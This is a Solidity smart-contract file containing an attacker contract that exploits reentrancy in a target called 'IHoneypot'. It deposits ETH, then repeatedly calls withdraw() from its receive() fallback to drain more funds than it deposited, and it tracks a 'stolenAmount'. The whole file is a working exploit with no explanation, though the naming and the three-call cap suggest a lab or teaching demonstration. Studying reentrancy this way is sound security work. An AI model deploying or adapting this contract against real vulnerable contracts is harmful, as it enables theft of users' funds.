// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IHoneypot {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackerContract {
    IHoneypot public honeypot;
    uint256   public attackCount;
    uint256   private stolenAmount;

    constructor(address _honeypot) {
        honeypot = IHoneypot(_honeypot);
    }

    function attack() external payable {
        require(msg.value > 0, "ETH gerekli");
        honeypot.deposit{value: msg.value}();
        stolenAmount = msg.value;
        honeypot.withdraw();
    }

    receive() external payable {
        if (attackCount < 3 && address(honeypot).balance >= stolenAmount) {
            attackCount++;
            honeypot.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}